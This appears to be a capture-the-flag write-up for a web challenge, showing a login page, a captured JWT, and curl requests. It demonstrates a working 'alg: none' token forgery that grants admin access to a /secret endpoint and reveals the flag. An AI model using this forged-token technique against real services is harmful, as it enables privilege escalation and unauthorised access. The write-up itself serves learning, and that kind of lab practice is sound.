---
tags:
  - Web/JWT
---
![[Pasted image 20250614081750.png]]

```

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Juche Jaguar – Login</title>
  <link rel="stylesheet" href="style.css"/>
</head>
<body>
  <div class="container">
    <img src="JJNT.png" alt="Juche Jaguar Logo" class="logo"/>
    <h1>Field Reports Login</h1>
    <form id="loginForm">
      <label for="user">Username</label>
      <input type="text" id="user" name="user" required/>
      <label for="pass">Password</label>
      <input type="password" id="pass" name="pass" required/>
      <button type="submit">Log In</button>
    </form>
    <p id="message" class="error"></p>
    <pre id="result"></pre>
  </div>
  <script>
    document.getElementById('loginForm').addEventListener('submit', async e => {
      e.preventDefault();
      document.getElementById('message').textContent = '';
      document.getElementById('result').textContent = '';
      const user = document.getElementById('user').value;
      const pass = document.getElementById('pass').value;
      try {
        const res = await fetch('/login', {
          method: 'POST',
          headers: {'Content-Type':'application/json'},
          body: JSON.stringify({user, pass})
        });
        const json = await res.json();
        if (res.ok) {
          document.getElementById('result').textContent = 'Token: ' + json.token;
        } else {
          document.getElementById('message').textContent = json.error;
        }
      } catch (err) {
        document.getElementById('message').textContent = 'Network error';
      }
    });
  </script>
</body>
</html>
```

Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWdlbnQiLCJyb2xlIjoidXNlciIsImlhdCI6MTc0OTkxNDM2MSwiZXhwIjoxNzQ5OTE3OTYxfQ.WRCo3aRj8w-D3UfFAK0_i_t2U1X-VuOsSdfd-JN6D5I

```
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: 34.85.163.182:8080' -H $'Content-Length: 36' -H $'Accept-Language: en-US,en;q=0.9' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36' -H $'Content-Type: application/json' -H $'Accept: */*' -H $'Origin: http://34.85.163.182:8080' -H $'Referer: http://34.85.163.182:8080/login.html' -H $'Accept-Encoding: gzip, deflate, br' -H $'Connection: keep-alive' \
    --data-binary $'{\"user\":\"agent\",\"pass\":\"spudpotato\"}' \
    $'http://34.85.163.182:8080/login'
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 179
ETag: W/"b3-t8VAtrJNcvX+0Ovo5hvXEd73TYI"
Date: Sat, 14 Jun 2025 15:21:38 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWdlbnQiLCJyb2xlIjoidXNlciIsImlhdCI6MTc0OTkxNDQ5OCwiZXhwIjoxNzQ5OTE4MDk4fQ._TT1Dh2YWIecWsUrErjvELB1ZBM4q1FqrMoYzOcwHPg"}
```

![[Pasted image 20250614082443.png]]


This is a JWT so each field is encoded in Base64, making it trivial to decode and inspect the contents. If the server doesn't sign or validate its tokens correctly, we may be able to modify it to change our access.

https://token.dev/

![[Pasted image 20250614083011.png]]

- Changed role to admin and copied token to submit again, but it was rejected as invalid:

```
curl -i -s -k -X GET http://34.85.163.182:8080/secret \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWdlbnQiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDk5MTQ0OTgsImV4cCI6MTc0OTk
xODA5OH0.yPObdMLlqW0FacTNg0K0arh_n4vtU5ybrFmMMselj8I"
HTTP/1.1 401 Unauthorized
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 25
ETag: W/"19-1luTU257I9tvKUXOJotGBQDVDqk"
Date: Sat, 14 Jun 2025 15:35:02 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"error":"Invalid token"}
```

Now I tried changing alg to "none" to skip verification (making sure to keep the trailing dot).
```
 curl -i -s -k -X GET http://34.85.163.182:8080/secret \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWdlbnQiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDk5MTQ0OTgsImV4cCI6MTc0OTkxODA5OH0."
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 31
ETag: W/"1f-ERTkdQmD3UVjMzGBqg6IDNGFRTg"
Date: Sat, 14 Jun 2025 15:40:10 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"flag":"C1{n0n3_4lg0_byp4ss}"}
```
